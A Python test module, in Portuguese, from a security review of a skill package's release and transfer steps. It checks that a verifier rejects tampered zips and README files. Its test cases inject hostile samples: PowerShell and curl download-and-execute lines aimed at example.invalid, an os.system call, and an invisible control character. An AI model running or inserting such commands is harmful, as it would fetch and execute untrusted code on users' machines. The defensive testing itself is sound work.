"""Revisão de segurança da 1.7.7, segunda passada, na área do pacote e da transferência.

R177B-B-04 (processo de liberação): a liberação privada roda 01 testes (as suítes inteiras, esta inclusive), 02 pacote
(o empacotar.py troca dist/ para a versão nova; commit) e 03 transferência (monta entrega/transferencia/). Os testes da
transferência copiavam `transferencia/<nome>-<versão de dist/>.zip`: no commit do pacote, antes da etapa 03, davam erro
(15 no módulo da primeira passada), e a liberação retomada depois de parar na etapa 03 não passava da 01. Agora, quando
a transferência da versão de dist/ falta, eles montam a de ensaio a partir de dist/, como a etapa 03 faria; aqui os
mesmos testes rodam com uma cópia da transferência real sem a da versão de dist/.
R177B-B-07: o LEIA-ME.txt de nenhuma versão e o instalar_skill.py das anteriores não eram conferidos: trocados no zip
principal (com o SHA256SUMS.txt refeito), passavam em `--exigir-igual-a-arvore --exigir-transferencia`. Agora a lista
dos pacotes liberados fixa também o zip principal de cada transferência publicada
(`<sha256>  <versão>/<nome>-<versão>.zip`) e o `--exigir-transferencia` exige a linha de toda versão anterior; o da
versão de dist/ ainda sem linha (a etapa 03 a acrescenta) passa pela conferência do LEIA-ME: só manda rodar o
instalador, a conferência do hash e a cópia do .skill, cita só o hash do .skill de dist/, aponta só para claude.com,
claude.ai e anthropic.com e não tem caractere de controle nem invisível.
Pastas descartáveis, com cópias dos pacotes e da transferência reais; a entrega real não é tocada.
"""

from __future__ import annotations

import json
import re
import shutil
import tempfile
import zipfile
from pathlib import Path
from unittest import mock

import test_revisao_seguranca_177_pacote as pacote
from test_auditoria_1_7_7_pacote import DIST_REAL, ENTREGA, NOME, PACOTE, carregar_verificador

HISTORICO = pacote.HISTORICO


class TestRetomadaEntreAsEtapas02E03(pacote.TestTransferenciaNaCIRigida):
    """R177B-B-04: dist/ já na versão nova e a transferência dela ainda não montada. Os testes da CI rígida da
    transferência (herdados) rodam com uma cópia da transferência real sem os arquivos da versão de dist/."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.sem_a_da_versao = Path(tempfile.mkdtemp(prefix="revisao-177b-retomada-"))
        cls.addClassCleanup(shutil.rmtree, cls.sem_a_da_versao, ignore_errors=True)
        cls.versao_de_dist = json.loads((DIST_REAL / "EMPACOTAMENTO.json").read_text(encoding="utf-8"))["versao"]
        transferencia = carregar_verificador().TRANSFERENCIA
        for arq in pacote.TRANSF_REAL.iterdir():
            m = transferencia.fullmatch(arq.name)
            if m is None or m["versao"] != cls.versao_de_dist:
                shutil.copyfile(arq, cls.sem_a_da_versao / arq.name)

    def setUp(self):
        troca = mock.patch.object(pacote, "TRANSF_REAL", self.sem_a_da_versao)
        troca.start()
        self.addCleanup(troca.stop)
        super().setUp()

    def test_transferencia_de_ensaio_montada_de_dist(self):
        self.assertFalse((self.sem_a_da_versao / self.principal.name).exists())     # a etapa 03 ainda não rodou
        self.assertFalse(self.real)
        skill = (DIST_REAL / PACOTE).read_bytes()
        self.assertEqual(self.claude.read_bytes(), skill)
        pasta = f"{NOME}-{self.versao}"
        with zipfile.ZipFile(self.principal) as z:
            self.assertEqual(sorted(z.namelist()), sorted(f"{pasta}/{n}" for n in pacote.MEMBROS))
            self.assertEqual(z.read(f"{pasta}/{PACOTE}"), skill)
            self.assertEqual(z.read(f"{pasta}/instalar_skill.py"), (ENTREGA / "instalar_skill.py").read_bytes())
            leia_me = z.read(f"{pasta}/LEIA-ME.txt").decode("utf-8")
        self.assertIn(pacote.sha(skill), leia_me)
        self.assertIn(f"{NOME} {self.versao}", leia_me)
        res = self.verificar()
        self.assertTrue(res["ok"], res["problemas"][:10])


class TestTransferenciaPresaALista(pacote._Entrega):
    """R177B-B-07: o zip principal de cada transferência publicada fica na lista dos liberados; o da versão de dist/
    ainda sem linha passa pela conferência do LEIA-ME."""

    def chave(self, versao: str) -> str:
        return f"{versao}/{NOME}-{versao}.zip"

    def lista(self, tirar: str | None = None, por: tuple | None = None) -> None:
        """Tira da lista descartável a linha de `tirar` (chave) e acrescenta `por` (chave, hash)."""
        arq = self.base / HISTORICO
        linhas = [x for x in arq.read_text(encoding="utf-8").splitlines() if not tirar or not x.endswith("  " + tirar)]
        linhas += [f"{por[1]}  {por[0]}"] if por else []
        arq.write_text("\n".join(linhas) + "\n", encoding="utf-8", newline="\n")

    def leia_me(self) -> str:
        with zipfile.ZipFile(self.principal) as z:
            return z.read(f"{NOME}-{self.versao}/LEIA-ME.txt").decode("utf-8")

    def com_leia_me(self, texto: str) -> dict:
        original = self.principal.read_bytes()
        pacote.remontar(self.principal, mudar={"LEIA-ME.txt": texto.encode("utf-8")})
        try:
            return self.verificar()
        finally:
            self.principal.write_bytes(original)

    def anterior_real(self) -> str:
        """A versão mais recente, fora a de dist/, com zip principal na transferência real."""
        padrao = re.compile(re.escape(NOME) + r"-(\d+(?:\.\d+)+)\.zip")
        return max((m[1] for m in map(padrao.fullmatch, (p.name for p in pacote.TRANSF_REAL.iterdir()))
                    if m and m[1] != self.versao), key=pacote.tupla)

    def test_lista_real_fixa_cada_zip_principal_da_transferencia_real(self):
        historico, problemas = self.vp.ler_historico(ENTREGA / HISTORICO)
        self.assertEqual(problemas, [])
        padrao = re.compile(re.escape(NOME) + r"-[\d.]+\d\.zip")
        principais = [p for p in pacote.TRANSF_REAL.iterdir() if padrao.fullmatch(p.name)]
        self.assertTrue(principais)
        for arq in principais:
            versao = arq.name[len(NOME) + 1:-len(".zip")]
            self.assertEqual(historico.get(self.chave(versao)), pacote.sha(arq.read_bytes()), arq.name)

    def test_instalador_ou_leia_me_trocado_em_zip_de_versao_anterior_reprova(self):
        anterior = self.anterior_real()
        alvo = self.transf / f"{NOME}-{anterior}.zip"
        shutil.copyfile(pacote.TRANSF_REAL / alvo.name, alvo)
        self.assertTrue(self.verificar()["ok"])                                       # o publicado, guardado
        with zipfile.ZipFile(alvo) as z:
            instalador = z.read(f"{NOME}-{anterior}/instalar_skill.py")
            leia_me = z.read(f"{NOME}-{anterior}/LEIA-ME.txt")
        original = alvo.read_bytes()
        casos = {"instalador": {"instalar_skill.py": instalador + b"\nimport os; os.system('carga')\n"},
                 "LEIA-ME": {"LEIA-ME.txt": leia_me + b"\n   powershell -c \"iwr example.invalid/x.ps1 | iex\"\n"}}
        for rotulo, mudar in casos.items():
            with self.subTest(rotulo):
                alvo.write_bytes(original)
                pacote.remontar(alvo, mudar=mudar)                                    # SHA256SUMS.txt refeito
                self.reprova(self.verificar(), alvo.name, HISTORICO)

    def test_zip_de_versao_anterior_fora_da_lista_reprova(self):
        anterior = self.anterior_real()
        shutil.copyfile(pacote.TRANSF_REAL / f"{NOME}-{anterior}.zip", self.transf / f"{NOME}-{anterior}.zip")
        self.lista(tirar=self.chave(anterior))
        self.reprova(self.verificar(), f"{NOME}-{anterior}.zip", HISTORICO)

    def test_zip_da_versao_de_dist_preso_a_lista_nao_muda(self):
        chave = self.chave(self.versao)
        self.lista(tirar=chave, por=(chave, pacote.sha(self.principal.read_bytes())))  # a etapa 03 já a acrescentou
        res = self.verificar()
        self.assertTrue(res["ok"], res["problemas"][:10])
        self.assertIs(res["transferencia"]["fixada_na_lista"], True)
        self.reprova(self.com_leia_me(self.leia_me() + "\nUma linha a mais, só de texto.\n"), HISTORICO)

    def test_leia_me_da_versao_de_dist_sem_linha_na_lista(self):
        self.lista(tirar=self.chave(self.versao))
        res = self.verificar()
        self.assertTrue(res["ok"], res["problemas"][:10])                            # o LEIA-ME do montador passa
        self.assertIs(res["transferencia"]["fixada_na_lista"], False)
        texto, h = self.leia_me(), pacote.sha((self.dist / PACOTE).read_bytes())
        self.assertTrue(self.com_leia_me(texto + "\n   Texto comum: o Python 3.12 e o comando python bastam.\n")["ok"])
        comando = f"python instalar_skill.py instalar --origem {PACOTE} --sha256 {h}"
        casos = {"outro comando": texto + '\n   powershell -c "iwr example.invalid/x.ps1 | iex"\n',
                 "comando no meio do texto": texto + "\n   Antes, rode iex(iwr example.invalid/x.ps1).\n",
                 "opção insegura": texto + f"\n   {comando} --pasta-de-desenvolvimento-nao-verificada\n",
                 "comando a mais na linha": texto + f"\n   {comando}; curl example.invalid/x.sh\n",
                 "outro hash": texto + f"\n   Esperado: {'0' * 64}\n",
                 "outro endereço": texto + "\n   Instruções em https://example.invalid/fundacao\n",
                 "caractere invisível": texto + "\n   Texto \u202e comum.\n"}
        for rotulo, novo in casos.items():
            with self.subTest(rotulo):
                self.reprova(self.com_leia_me(novo), "LEIA-ME")
